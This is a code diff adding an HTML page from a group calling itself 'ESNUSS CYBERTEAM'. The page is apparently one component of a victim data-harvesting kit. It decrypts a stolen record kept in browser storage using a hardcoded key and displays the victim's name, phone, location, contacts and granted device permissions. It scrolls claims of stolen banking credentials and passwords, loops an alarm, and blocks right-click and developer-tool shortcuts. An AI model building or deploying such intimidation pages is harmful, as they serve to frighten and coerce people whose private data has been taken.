@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SYSTEM BREACH DETECTED</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            overflow: hidden;
+        }
+        
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.3;
+            z-index: -1;
+        }
+        
+        .terminal {
+            padding: 20px;
+            height: 100vh;
+            overflow-y: auto;
+        }
+        
+        .command {
+            color: #0f0;
+            margin: 10px 0;
+        }
+        
+        .output {
+            color: #0ff;
+            margin-left: 20px;
+        }
+        
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        .warning {
+            color: #f00;
+            font-size: 24px;
+            text-align: center;
+            margin: 40px 0;
+            text-shadow: 0 0 10px #f00;
+        }
+        
+        .data-display {
+            background: #111;
+            border: 1px solid #0f0;
+            padding: 20px;
+            margin: 20px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+    
+    <div class="terminal">
+        <div class="warning">
+            ⚠️ SYSTEM BREACH DETECTED ⚠️
+        </div>
+        
+        <div class="command">> Initializing system scan...</div>
+        <div class="output">✓ Device information captured</div>
+        <div class="output">✓ Location data acquired</div>
+        <div class="output">✓ Camera access established</div>
+        <div class="output">✓ Microphone activated</div>
+        <div class="output">✓ File system accessed</div>
+        <div class="output">✓ Contacts extracted</div>
+        <div class="output">✓ Clipboard data retrieved</div>
+        <div class="output">✓ Network information logged</div>
+        
+        <div class="command">> Displaying victim data:</div>
+        <div id="victimData" class="data-display">
+            Loading victim information...
+        </div>
+        
+        <div class="command">> System status: <span style="color:#f00;">COMPROMISED</span></div>
+        <div class="command">> Next action: <span class="blink">█</span></div>
+        
+        <div style="position: fixed; bottom: 20px; left: 0; width: 100%; text-align: center; color: #f00;">
+            ESNUSS CYBERTEAM - ALL YOUR DATA ARE BELONG TO US
+        </div>
+    </div>
+
+    <script>
+        // Matrix effect
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&!';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#0f0';
+            ctx.font = `${fontSize}px monospace`;
+            
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 50);
+        
+        // Display victim data
+        function displayVictimData() {
+            try {
+                const encrypted = localStorage.getItem('victim_data_full');
+                if (encrypted) {
+                    // Decrypt data
+                    const decrypted = CryptoJS.AES.decrypt(encrypted, 'esnuss-cyber-team-2024');
+                    const data = JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
+                    
+                    let html = `
+                        <strong>VICTIM ID:</strong> ${data.personal.phone || 'UNKNOWN'}<br>
+                        <strong>NAME:</strong> ${data.personal.nama || 'UNKNOWN'}<br>
+                        <strong>LOCATION:</strong> ${data.location.latitude ? `${data.location.latitude}, ${data.location.longitude}` : 'TRACKING...'}<br>
+                        <strong>DEVICE:</strong> ${data.device.userAgent.substring(0, 50)}...<br>
+                        <strong>APPS INSTALLED:</strong> ${data.additional.installedApps ? data.additional.installedApps.join(', ') : 'SCANNING...'}<br>
+                        <strong>CAMERA ACCESS:</strong> ${data.media.cameraAccess ? '✓ GRANTED' : '✗ DENIED'}<br>
+                        <strong>MIC ACCESS:</strong> ${data.media.microphoneAccess ? '✓ GRANTED' : '✗ DENIED'}<br>
+                        <strong>FILES ACCESSED:</strong> ${data.files.directoryAccess ? '✓ GRANTED' : '✗ DENIED'}<br>
+                        <strong>CONTACTS:</strong> ${data.additional.contacts ? data.additional.contacts.length + ' captured' : '0'}<br>
+                    `;
+                    
+                    document.getElementById('victimData').innerHTML = html;
+                }
+            } catch (e) {
+                document.getElementById('victimData').innerHTML = 'DATA ENCRYPTED - DECRYPTION IN PROGRESS...';
+            }
+        }
+        
+        // Auto-scroll terminal
+        function autoScroll() {
+            const terminal = document.querySelector('.terminal');
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        // Add more terminal commands dynamically
+        function simulateHack() {
+            const commands = [
+                "> Extracting banking credentials...",
+                "> Scanning for saved passwords...",
+                "> Accessing social media accounts...",
+                "> Monitoring real-time communications...",
+                "> Preparing data exfiltration...",
+                "> Establishing persistent access...",
+                "> Covering tracks..."
+            ];
+            
+            let i = 0;
+            const interval = setInterval(() => {
+                if (i < commands.length) {
+                    const cmd = document.createElement('div');
+                    cmd.className = 'command';
+                    cmd.textContent = commands[i];
+                    document.querySelector('.terminal').appendChild(cmd);
+                    i++;
+                    autoScroll();
+                } else {
+                    clearInterval(interval);
+                }
+            }, 2000);
+        }
+        
+        // Initialize
+        window.onload = function() {
+            displayVictimData();
+            simulateHack();
+            autoScroll();
+            
+            // Play scary sound
+            const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3');
+            audio.loop = true;
+            audio.volume = 0.5;
+            audio.play().catch(e => console.log('Audio blocked'));
+            
+            // Block right click
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            
+            // Block keyboard shortcuts
+            document.addEventListener('keydown', e => {
+                if (e.ctrlKey || e.key === 'F12') {
+                    e.preventDefault();
+                }
+            });
+        };
+    </script>
+</body>
+</html>
